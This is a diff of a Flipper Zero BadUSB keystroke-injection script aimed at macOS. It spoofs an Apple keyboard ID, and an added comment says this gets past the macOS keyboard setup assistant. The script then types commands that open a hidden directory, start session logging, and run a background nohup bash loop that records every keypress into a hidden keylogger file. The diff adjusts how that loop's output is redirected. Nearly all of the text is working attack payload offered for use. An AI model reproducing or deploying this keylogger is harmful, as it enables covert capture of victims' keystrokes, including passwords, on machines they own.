@@ -1,4 +1,7 @@
 ID 05ac:021e Apple:Keyboard
+REM Keep these 3 lines IF (and only if) it's the first time you are performing a badKB attack against a specific macOS target. 
+REM In fact, it helps Flipper Zero bypass the macOS keyboard setup assistant. Otherwise the attack will not start.
+
 REM Author: 47LeCoste
 REM Version 1.0 (Flipper Ducky)
 REM Target: macOS
@@ -18,7 +21,7 @@ ENTER
 STRING "script ~/.hidden/keylogger.txt"
 DELAY 500
 ENTER
-STRING "nohup bash -c 'while true; do read -rsn1 input; echo -n \"$input\" >> ~/.hidden/keylogger.txt; done &' > /dev/null 2>&1 &"
+STRING "nohup bash -c 'while true; do read -rsn1 input; echo -n \"$input\" >> ~/.hidden/keylogger.txt; done' > ~/.hidden/keylogger.log 2>&1 &"
 DELAY 500
 ENTER
 CTRL A
